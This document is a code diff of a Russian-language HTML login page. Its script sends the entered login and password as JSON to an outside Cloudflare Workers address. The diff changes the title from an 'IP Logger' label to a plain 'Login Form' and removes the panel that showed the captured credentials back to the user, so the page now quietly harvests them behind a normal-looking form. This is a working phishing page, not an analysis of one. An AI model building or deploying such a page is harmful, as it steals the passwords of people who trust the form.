@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Login & IP Logger с копированием</title>
+  <title>Login Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -32,10 +32,6 @@
       border: 1px solid #ccc;
       border-radius: 4px;
     }
-    input[readonly] {
-      background: #fafafa;
-      cursor: pointer;
-    }
     button {
       padding: 10px;
       margin: 8px 0;
@@ -46,12 +42,6 @@
       cursor: pointer;
     }
     button:hover { background: #0056b3; }
-    .copied-notice {
-      font-size: 0.9em;
-      color: #080;
-      margin-top: 4px;
-      height: 1em;
-    }
   </style>
 </head>
 <body>
@@ -63,40 +53,11 @@
       <input type="password" name="password" placeholder="Password" required>
       <button type="submit">Отправить</button>
     </form>
-
-    <!-- Блок для вывода и копирования данных -->
-    <div id="result" style="display:none; margin-top:20px;">
-      <h2>Скопируйте данные</h2>
-      <input type="text" id="outLogin" readonly title="Кликни, чтобы скопировать">
-      <input type="text" id="outPassword" readonly title="Кликни, чтобы скопировать">
-      <div class="copied-notice" id="copiedNotice"></div>
-    </div>
   </div>
 
   <script>
     const WORKER_URL = 'https://mute-scene-f7f5.kamrantataloo69.workers.dev/';
     const form = document.getElementById('loginForm');
-    const resultBlock = document.getElementById('result');
-    const outLogin = document.getElementById('outLogin');
-    const outPassword = document.getElementById('outPassword');
-    const copiedNotice = document.getElementById('copiedNotice');
-
-    // Функция для копирования текста и показа уведомления
-    function makeCopyable(el) {
-      el.addEventListener('click', async () => {
-        try {
-          await navigator.clipboard.writeText(el.value);
-          copiedNotice.textContent = `"${el.value}" скопировано!`;
-          setTimeout(() => copiedNotice.textContent = '', 2000);
-        } catch (e) {
-          copiedNotice.textContent = 'Не удалось скопировать';
-        }
-      });
-    }
-
-    // Вешаем на выходные поля
-    makeCopyable(outLogin);
-    makeCopyable(outPassword);
 
     form.addEventListener('submit', async e => {
       e.preventDefault();
@@ -110,14 +71,9 @@
         body: JSON.stringify({ login, password })
       });
 
-      // Показываем блок с копированием и заполняем поля
-      outLogin.value = login;
-      outPassword.value = password;
-      resultBlock.style.display = 'block';
       form.reset();
     });
   </script>
 
 </body>
 </html>
- 
